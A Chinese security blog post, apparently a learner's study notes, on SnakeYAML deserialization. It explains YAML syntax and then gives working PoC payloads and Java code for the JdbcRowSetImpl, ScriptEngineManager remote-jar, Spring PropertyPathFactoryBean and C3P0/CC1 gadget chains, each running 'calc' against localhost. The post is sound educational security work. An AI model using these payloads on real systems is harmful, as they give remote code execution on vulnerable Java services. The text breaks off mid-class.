@@ -1,0 +1,1497 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="SnakeYAML 反序列化, marin的小窝">
+    <meta name="description" content="SnakeYAML 反序列化SnakeYAML 是 java 中解析 yaml 的库，支持将 java 对象和 YAML 数据互相转换
+YAML 基本语法YAML 是一种有极高可读性的数据，是一种以数据为中心的语言，任何有效的 JSON 文">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>SnakeYAML 反序列化 | marin的小窝</title>
+    <link rel="icon" type="image/jpeg" href="/favicon.jpg">
+    
+
+
+    <!-- bg-cover style     -->
+
+
+
+<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="/css/matery.css">
+<link rel="stylesheet" type="text/css" href="/css/my.css">
+<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
+
+
+
+
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/css/post.css">
+
+
+
+
+    
+        <link rel="stylesheet" type="text/css" href="/css/reward.css">
+    
+
+
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">marin的小窝</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>主页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>类型</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于我</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友链</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+  <li>
+    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
+      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">marin的小窝</div>
+        <div class="logo-desc">
+            
+            一个学习网安的小菜鸡
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			主页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			类型
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于我
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友链
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/3635372_95770536_p0.png')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">SnakeYAML 反序列化</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/web/">
+                                <span class="chip bg-color">web</span>
+                            </a>
+                        
+                            <a href="/tags/java/">
+                                <span class="chip bg-color">java</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" class="post-category">
+                                学习记录
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2026-01-13
+                </div>
+                
+
+                
+
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="SnakeYAML-反序列化"><a href="#SnakeYAML-反序列化" class="headerlink" title="SnakeYAML 反序列化"></a>SnakeYAML 反序列化</h1><p><code>SnakeYAML</code> 是 java 中解析 yaml 的库，支持将 java 对象和 YAML 数据互相转换</p>
+<h2 id="YAML-基本语法"><a href="#YAML-基本语法" class="headerlink" title="YAML 基本语法"></a>YAML 基本语法</h2><p>YAML 是一种有极高可读性的数据，是一种以数据为中心的语言，任何有效的 JSON 文件都可以被 YAML 解析器识别并处理</p>
+<ul>
+<li><p>YAML 是用空格缩进来表示数据的结构<br>不能使用 Tab，只允许使用空格</p>
+</li>
+<li><p>键值对<br>​<code>键: 值</code> 冒号后面必须跟一个空格</p>
+<pre class="line-numbers language-yaml" data-language="yaml" data-start="1"><code class="language-yaml">version: 10.0</code></pre></li>
+<li><p>列表<br>以 <code>-</code> 开头，后面跟一个空格，每项一行</p>
+<pre class="line-numbers language-yaml" data-language="yaml" data-start="1"><code class="language-yaml">person: 
+  - marin
+  - limbo</code></pre></li>
+<li><p>纯量<br>纯量是基本的不可再分的值</p>
+</li>
+<li><p>引用</p>
+<p><code>&amp;</code> 锚点，用来标记要重复使用的数据</p>
+<p><code>*</code> 别名，用来指向已经定义锚点的数据块</p>
+<p><code>&lt;&lt;</code> 合并键引用，用来将一个键值对的内容合并到另一个键值对中，如果有键名相同的，被合并键值对中的会被覆盖</p>
+<pre class="line-numbers language-yaml" data-language="yaml" data-start="1"><code class="language-yaml">person: &amp;person
+  name: marin
+  age: 18
+  job: student
+
+student:
+  name: limbo
+  total: 1
+  class: 2
+  &lt;&lt;: *person</code></pre>
+
+<p>上面那个文件就相当于</p>
+<pre class="line-numbers language-yaml" data-language="yaml" data-start="1"><code class="language-yaml">person: &amp;person
+  name: marin
+  age: 18
+  job: student
+
+student:
+  name: limbo
+  age: 18
+  job: student
+  total: 1
+  class: 2</code></pre></li>
+<li><p>注释 <code>#</code></p>
+</li>
+<li><p>大小写敏感</p>
+</li>
+</ul>
+<h3 id="序列化和反序列化函数"><a href="#序列化和反序列化函数" class="headerlink" title="序列化和反序列化函数"></a>序列化和反序列化函数</h3><p>在 <code>Snakeyaml</code>​ 中提供了 <code>Yaml.dump()</code>​ 和 <code>Yaml.load()</code> 两个函数对 yaml 格式的数据进行序列化和反序列化</p>
+<ul>
+<li><code>Yaml.load()</code>：传入一个字符串或者一个文件，经过序列化后返回一个 java 对象</li>
+<li><code>Yaml.dump()</code>：将一个 java 对象转化为 yaml 格式</li>
+</ul>
+<p>依赖导入：</p>
+<pre class="line-numbers language-markup" data-language="markup" data-start="1"><code class="language-markup">&lt;dependency&gt;
+    &lt;groupId&gt;org.yaml&lt;&#x2F;groupId&gt;
+    &lt;artifactId&gt;snakeyaml&lt;&#x2F;artifactId&gt;
+    &lt;version&gt;1.26&lt;&#x2F;version&gt;
+&lt;&#x2F;dependency&gt;</code></pre>
+
+<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p>用来序列化的 Person 类</p>
+<pre class="line-numbers language-java" data-language="java" data-start="1"><code class="language-java">public class Person &#123;
+    public int age;
+    private String name;
+
+    public Person() &#123;
+        System.out.println(&quot;无参构造方法&quot;);
+    &#125;
+
+    public Person(String name,int age) &#123;
+        this.age &#x3D; age;
+        this.name &#x3D; name;
+        System.out.println(&quot;有参构造方法&quot;);
+    &#125;
+
+
+    public String getName() &#123;
+        System.out.println(&quot;getName方法&quot;);
+        return name;
+    &#125;
+
+    public void setName(String name) &#123;
+        System.out.println(&quot;setName方法&quot;);
+        this.name &#x3D; name;
+    &#125;
+&#125;
+</code></pre>
+
+<p>测试序列化与反序列化</p>
+<pre class="line-numbers language-java" data-language="java" data-start="1"><code class="language-java">public class SnakeyamlDemo &#123;
+    public static void main(String[] args) &#123;
+        Yaml yaml &#x3D; new Yaml();
+        Person marin &#x3D; new Person(&quot;marin&quot;,18);
+        String str &#x3D; yaml.dump(marin);
+        System.out.println(&quot;序列化&quot;);
+        System.out.println(str);
+
+        Object marin2 &#x3D; yaml.load(str);
+        System.out.println(&quot;反序列化&quot;);
+        System.out.println(marin2);
+    &#125;
+&#125;
+</code></pre>
+
+<p>这里 <code>!!com.marin.Person</code> 是来用指定反序列化的类名</p>
+<p><code>SnakeYAML</code>​ 在序列化的时候，如果是 <code>public</code>​ 属性则通过反射获取，非 <code>public</code>​ 但是有 <code>getter</code>​ 方法的属性可以通过 <code>getter</code> 获取，静态属性会被忽略</p>
+<p>反序列化也是一样的，会先通过无参构造器创建一个新的实例，然后 <code>public</code>​ 属性则通过反射赋值，非 <code>public</code>​ 但是有 <code>setter</code>​ 方法的属性可以通过 <code>setter</code> 赋值，静态属性会被忽略</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251002113756.png" alt="image"></p>
+<h4 id="调用有参构造方法"><a href="#调用有参构造方法" class="headerlink" title="调用有参构造方法"></a>调用有参构造方法</h4><p><code>SnakeYAML</code> 默认是调用无参构造器，但是也可以调用有参构造方法</p>
+<p>比如下面的 Yaml 数据，<code>SnakeYAML</code>​ 会测试将序列元素按顺序匹配构造函数的参数，这里就应该会匹配 <code>Ponint(int x,int y)</code></p>
+<pre class="line-numbers language-yaml" data-language="yaml" data-start="1"><code class="language-yaml">!!com.example.Point [10, 20]</code></pre>
+
+<h4 id="调用-hashcode"><a href="#调用-hashcode" class="headerlink" title="调用 hashcode"></a>调用 hashcode</h4><p><code>SnakeYaml</code>​ 在处理类的时候，会判断是不是一个 Map 结构，如果是一个 Map 对象时，解析完 key 值之后，就会调用 key 的 <code>hashcode</code> 方法判断 key 值有没有重复</p>
+<p>‍</p>
+<p>‍</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><code>SnakeYAML</code>​ 反序列化的关键触发点就是无参构造方法和非公有属性的 <code>setter</code> 方法</p>
+<h3 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h3><p><code>com.sun.rowset.JdbcRowSetImpl</code>​ 这条利用链是由于 <code>javax.naming.InitialContext#lookup()</code> 方法的参数可控导致的 JNDI 注入</p>
+<p>由前文知道，YAML 反序列化的入口类很大概率是无参构造方法或者是 <code>setter</code> 方法</p>
+<p>这里跟着网上找到了这个 <code>setAutoCommit</code>​ 的 <code>setter</code>​ 方法，在里面调用了 <code>connect()</code> 方法</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251003143909.png" alt="image"></p>
+<p>跟进方法可以看到这里有 <code>lookup</code>​ 方法进行 JNDI 远程调用，参数是 <code>getDataSourceName</code> 方法，继续跟进</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251003144017.png" alt="image"></p>
+<p>发现只要将 <code>dataSource</code> 设置成恶意的 JNDI 地址就可以</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251003144205.png" alt="image"></p>
+<p><strong>payload</strong></p>
+<pre class="line-numbers language-yaml" data-language="yaml" data-start="1"><code class="language-yaml">!!com.sun.rowset.JdbcRowSetImpl &#123;
+  dataSourceName: 
+    rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;EvilClass, 
+    autoCommit: true
+&#125;</code></pre>
+
+<h4 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h4><pre class="line-numbers language-java" data-language="java" data-start="1"><code class="language-java">JdbcRowSetImpl#setAutoCommit()
+- JdbcRowSetImpl#connect()
+-- JdbcRowSetImpl#lookup()</code></pre>
+
+<h4 id="测试实现"><a href="#测试实现" class="headerlink" title="测试实现"></a>测试实现</h4><p>这里本来是想利用 php 反序列化的经验，序列化出来一个 payload，但是好像 java 不能这样，这个数据无法序列化出来</p>
+<blockquote>
+<p>这里运行使用的是 jdk 17 版本，设置了很多安全限制，需要在运行时加一些参数</p>
+<p>在下面的运行中修改运行配置</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251003153143.png" alt="image"></p>
+<p>在修改选项中要选中 <strong>添加虚拟机选项</strong></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251003153217.png" alt="image"></p>
+</blockquote>
+<p>一开始测试的是 JNDI + RMI 注入，这里用到的是 <code>dataSourceName</code>​ 因为只有这个有 <code>setter</code>​ 方法的，如果直接用 <code>dataSource</code> 是不行的</p>
+<pre class="line-numbers language-java" data-language="java" data-start="1"><code class="language-java">import org.yaml.snakeyaml.Yaml;
+import java.sql.SQLException;
+
+public class pocDemo1 &#123;
+    public static void main(String[] args) throws SQLException &#123;
+        String poc &#x3D; &quot;!!com.sun.rowset.JdbcRowSetImpl &#123;dataSourceName: rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;EvilClass, autoCommit: true&#125;&quot;;
+        Yaml yaml &#x3D; new Yaml();
+        yaml.load(poc);
+    &#125;
+&#125;</code></pre>
+
+<p>运行时要添加选项</p>
+<pre class="line-numbers language-java" data-language="java" data-start="1"><code class="language-java">--add-opens
+java.sql.rowset&#x2F;com.sun.rowset&#x3D;ALL-UNNAMED
+--add-opens
+jdk.naming.rmi&#x2F;com.sun.jndi.rmi.registry&#x3D;ALL-UNNAMED
+-Dcom.sun.jndi.rmi.object.trustURLCodebase&#x3D;true
+-Dcom.sun.jndi.ldap.object.trustURLCodebase&#x3D;true</code></pre>
+
+<p>同时还要设置一个设置 RMI 服务的代码</p>
+<pre class="line-numbers language-java" data-language="java" data-start="1"><code class="language-java">import com.sun.jndi.rmi.registry.ReferenceWrapper;
+import javax.naming.NamingException;
+import javax.naming.Reference;
+import java.rmi.RemoteException;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+
+public class RmiServer &#123;
+    public static void main(String[] args) throws NamingException, RemoteException &#123;
+        Reference reference &#x3D; new Reference(&quot;EvilClass&quot;, &quot;EvilClass&quot;, &quot;http:&#x2F;&#x2F;127.0.0.1:8002&#x2F;&quot;);
+        ReferenceWrapper referenceWrapper &#x3D; new ReferenceWrapper(reference);
+        &#x2F;&#x2F; 将 RMI 服务注册到 1099 端口
+        Registry registry &#x3D; LocateRegistry.createRegistry(1099);
+        &#x2F;&#x2F; 绑定 Reference 对象
+        registry.rebind(&quot;EvilClass&quot;, referenceWrapper);
+    &#125;
+&#125;</code></pre>
+
+<p>在运行中要添加以下选项</p>
+<pre class="line-numbers language-java" data-language="java" data-start="1"><code class="language-java">--add-exports jdk.naming.rmi&#x2F;com.sun.jndi.rmi.registry&#x3D;ALL-UNNAMED</code></pre>
+
+<p>最后成功弹出计算器</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251003153421.png" alt="image"></p>
+<ul>
+<li>如果将版本切换到 8u65 就不需要设置这么多东西（</li>
+</ul>
+<p>‍</p>
+<h3 id="ScriptEngineManager"><a href="#ScriptEngineManager" class="headerlink" title="ScriptEngineManager"></a>ScriptEngineManager</h3><p>这个反序列化漏洞点在于 <code>ScriptEngineManager</code> 类的有参构造方法</p>
+<p>这个有参构造方法通过调用底层的 SPI 机制，去查找实现了 <code>ScriptEngineFactory</code> 接口的类并初始化</p>
+<p>SPI 机制简要来说就是 JDK 内置的服务发现机制，会在 <code>ClassPath</code>​ 路径下的 <code>META-INF/services</code> 文件夹下查找文件，自动加载文件中定义的类</p>
+<p><code>ScriptEngineFactory</code>​ 就是利用这个机制，去找到 <code>META-INF/services</code>​目录下的 <code>javax.script.ScriptEngineFactory</code> 然后加载文件中执行的类并初始化</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251003162909.png" alt="image"></p>
+<h4 id="调用链-1"><a href="#调用链-1" class="headerlink" title="调用链"></a>调用链</h4><pre class="line-numbers language-java" data-language="java" data-start="1"><code class="language-java">ScriptEngineManager#ScriptEngineManager()
+- ScriptEngineManager#init()
+-- ScriptEngineManager#initEngines()</code></pre>
+
+<h4 id="测试实现-1"><a href="#测试实现-1" class="headerlink" title="测试实现"></a>测试实现</h4><p>poc</p>
+<p><code>URLClassLoader(URL[] urls)</code>​ 这是 <code>java.net.URLClassLoader</code> 的构造函数，所以要多加一层中括号，将 url 包装成一个数组</p>
+<pre class="line-numbers language-yaml" data-language="yaml" data-start="1"><code class="language-yaml">!!javax.script.ScriptEngineManager [
+  !!java.net.URLClassLoader [
+    [
+      !!java.net.URL [
+        &quot;http:&#x2F;&#x2F;127.0.0.1:8002&#x2F;yaml-payload.jar&quot;
+      ]
+    ]
+  ] 
+]</code></pre>
+
+<p>测试类</p>
+<pre class="line-numbers language-java" data-language="java" data-start="1"><code class="language-java">public class ScriptEngineDemo &#123;
+    public static void main(String[] args) &#123;
+        String poc &#x3D; &quot;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\&quot;http:&#x2F;&#x2F;127.0.0.1:8002&#x2F;yaml-payload.jar\&quot;]]]]&quot;;
+        Yaml yaml &#x3D; new Yaml();
+        yaml.load(poc);
+    &#125;
+&#125;</code></pre>
+
+<p>为了利用 <code>ScriptEngineManager</code>​ 我们要在远程地址下载一个 jar 文件，jar 文件下的 <code>META-INF/services</code> 要包含被加载的恶意类，我们需要构建一个项目</p>
+<p>在 <code>META-INF/services/javax.script.ScriptEngineFactory</code> 文件中定义要被加载的类名</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251003170106.png" alt="image"></p>
+<p>然后创建对应类并且实现 <code>ScriptEngineFactory</code> 接口，在构造方法中命令执行</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251003170136.png" alt="image"></p>
+<p>然后要编译目标类</p>
+<pre class="line-numbers language-cmd" data-language="cmd" data-start="1"><code class="language-cmd">javac Poc.java</code></pre>
+
+<p>然后将项目打包成 jar 包</p>
+<pre class="line-numbers language-cmd" data-language="cmd" data-start="1"><code class="language-cmd">jar -cvf yaml-payload.jar src&#x2F;main&#x2F;java&#x2F; .</code></pre>
+
+<p>最后开一个服务，就能开始测试</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251003170318.png"></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251003170338.png" alt="image"></p>
+<p>‍</p>
+<h3 id="Spring-PropertyPathFactoryBean"><a href="#Spring-PropertyPathFactoryBean" class="headerlink" title="Spring PropertyPathFactoryBean"></a>Spring PropertyPathFactoryBean</h3><p>需要有 Spring 依赖</p>
+<pre class="line-numbers language-markup" data-language="markup" data-start="1"><code class="language-markup">&lt;dependency&gt;
+    &lt;groupId&gt;org.springframework&lt;&#x2F;groupId&gt;
+    &lt;artifactId&gt;spring-context&lt;&#x2F;artifactId&gt;
+    &lt;version&gt;5.3.30&lt;&#x2F;version&gt;
+&lt;&#x2F;dependency&gt;</code></pre>
+
+<p>payload</p>
+<pre class="line-numbers language-yaml" data-language="yaml" data-start="1"><code class="language-yaml">!!org.springframework.beans.factory.config.PropertyPathFactoryBean
+  targetBeanName: ldap:&#x2F;&#x2F;127.0.0.1:8003&#x2F;EvilClass
+  propertyPath: test
+  beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory
+    shareableResources: [ldap:&#x2F;&#x2F;127.0.0.1:8003&#x2F;EvilClass]</code></pre>
+
+<p>漏洞点在 <code>PropertyPathFactoryBean</code>​ 类的 <code>setBeanFactory</code>​ 方法中，在这个方法中，发现触发了 <code>getBean</code> 方法，跟进去</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251004103436.png" alt="image"></p>
+<p>发现是一个接口，查看实现，发现有一个和 JNDI 有关的类，跟进去</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251004103522.png" alt="image"></p>
+<p>继续触发了 <code>doGetSingleton</code> 方法</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251004103602.png" alt="image"></p>
+<p>然后一直在跟进 <code>lookup</code>​ 方法，最后是用了一个匿名内部类的方式调用的 <code>lookup</code> 方法</p>
+<h4 id="调用链-2"><a href="#调用链-2" class="headerlink" title="调用链"></a>调用链</h4><p><code>JndiTemplate$1</code>​ 就是代表一个匿名内部类，他在代码中即时定义和创建，这里就会创建一个内部类来进行 <code>lookup</code></p>
+<pre class="line-numbers language-java" data-language="java" data-start="1"><code class="language-java">PropertyPathFactoryBean#setBeanFactory(BeanFactory)
+- SimpleJndiBeanFactory#getBean(String)
+-- SimpleJndiBeanFactory#getBean(String,Class&lt;T&gt;)
+--- SimpleJndiBeanFactory#doGetSingleton(String,Class&lt;T&gt;)
+---- JndiLocatorSupport#lookup(String,Class&lt;T&gt;)
+----- JndiTemplate#lookup(String,Class&lt;T&gt;)
+------ JndiTemplate#lookup(String)
+------- JndiTemplate#execute(JndiCallback&lt;T&gt;)
+-------- JndiTemplate$1#doInContext(Context)
+--------- InitialContext#lookup(String)</code></pre>
+
+<h4 id="测试实现-2"><a href="#测试实现-2" class="headerlink" title="测试实现"></a>测试实现</h4><p>成功弹计算器了</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251004112124.png" alt="image"></p>
+<p>‍</p>
+<h3 id="C3P0-WrapperConnectionPoolDataSource"><a href="#C3P0-WrapperConnectionPoolDataSource" class="headerlink" title="C3P0 WrapperConnectionPoolDataSource"></a>C3P0 WrapperConnectionPoolDataSource</h3><p>依赖</p>
+<pre class="line-numbers language-markup" data-language="markup" data-start="1"><code class="language-markup">&lt;dependency&gt;
+    &lt;groupId&gt;com.mchange&lt;&#x2F;groupId&gt;
+    &lt;artifactId&gt;c3p0&lt;&#x2F;artifactId&gt;
+    &lt;version&gt;0.9.5.2&lt;&#x2F;version&gt;
+&lt;&#x2F;dependency&gt;</code></pre>
+
+<p>poc</p>
+<pre class="line-numbers language-yaml" data-language="yaml" data-start="1"><code class="language-yaml">!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource
+  userOverridesAsString: HexAsciiSerializedMap: hex 数据</code></pre>
+
+<p>这个漏洞利用的是 <code>WrapperConnectionPoolDataSource</code> 的构造函数</p>
+<p>默认调用无参构造器之后就会调用有参的构造器，在有参构造器中会调用 <code>parseUserOverridesAsString</code> 方法</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251004141517.png" alt="image"></p>
+<p>这个方法会检查有没有前缀 <code>HexAsciiSerializedMap</code> 如果有的话就会剥离前缀和最后的分号，然后解码数据反序列化，这里就是二次反序列化的地方</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251004141726.png" alt="image"></p>
+<h4 id="调用链-3"><a href="#调用链-3" class="headerlink" title="调用链"></a>调用链</h4><pre class="line-numbers language-java" data-language="java" data-start="1"><code class="language-java">WrapperConnectionPoolDataSource#WrapperConnectionPoolDataSource()
+- WrapperConnectionPoolDataSource#WrapperConnectionPoolDataSource(boolean)
+-- C3P0ImplUtils#parseUserOverridesAsString(String)
+--- ByteUtils#fromHexAscii(String)  # hex 数据解码为字节数组
+---- SerializableUtils#fromByteArray(byte[])
+----- SerializableUtils#deserializeFromByteArray(byte[]) # 反序列化字节数组</code></pre>
+
+<p>‍</p>
+<h4 id="测试实现-3"><a href="#测试实现-3" class="headerlink" title="测试实现"></a>测试实现</h4><p>因为是二次反序列化，这里要搭配其他的反序列化利用链，这里利用了 CC1 链</p>
+<pre class="line-numbers language-java" data-language="java" data-start="1"><code class="language-java">import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.TransformedMap;
+import org.yaml.snakeyaml.Yaml;
+import com.mchange.v2.c3p0.WrapperConnectionPoolDataSource;
+import java.io.*;
+import java.lang.annotation.Target;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationTargetException;
+import java.util.HashMap;
+import java.util.Map;
+
+public class Poc &#123;
+    public static Map exp() throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;
+
+        Transformer[] transformers &#x3D; new Transformer[]&#123;
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(
+                        &quot;getMethod&quot;,
+                        new Class[]&#123;String.class,Class[].class&#125;,
+                        new Object[]&#123;&quot;getRuntime&quot;,new Class[0]&#125;
+                ),
+                new InvokerTransformer(
+                        &quot;invoke&quot;,
+                        new Class[]&#123;Object.class,Object[].class&#125;,
+                        new Object[]&#123;null,new Object[0]&#125;
+                ),
+                new InvokerTransformer(
+                        &quot;exec&quot;,
+                        new Class[]&#123;String.class&#125;,
+                        new Object[]&#123;&quot;calc&quot;&#125;
+                ),
+        &#125;;
+
+        Transformer chainedTransformer &#x3D; new ChainedTransformer(transformers);
+
+        Map map &#x3D; new HashMap();
+        map.put(&quot;value&quot;,&quot;123&quot;);
+        Map transformedMap &#x3D; TransformedMap.decorate(map, null, chainedTransformer);
+        Class AIHdl &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+        Constructor AIHdlConstructor &#x3D; AIHdl.getDeclaredConstructor(Class.class,Map.class);
+        AIHdlConstructor.setAccessible(true);
+        Object o &#x3D; AIHdlConstructor.newInstance(Target.class,transformedMap);
+        HashMap&lt;Object,Object&gt; hashmap &#x3D; new  HashMap&lt;&gt;();
+        hashmap.put(o,&quot;p&quot;);
+
+        return hashmap;
+    &#125;
+
+    static void addHexAscii(byte b, StringWriter sw)&#123;
+        int ub &#x3D; b &amp; 0xFF;
+        int h1 &#x3D; ub &#x2F; 16;
+        int h2 &#x3D; ub % 16;
+        sw.write(toHexDigit(h1));
+        sw.write(toHexDigit(h2));
+    &#125;
+
+    private static char toHexDigit(int h) &#123;
+        char out;
+        if (h &lt;&#x3D; 9) out &#x3D; (char)(h + 0x30);
+        else out &#x3D; (char)(h + 0x37);
+        return out;
+    &#125;
+
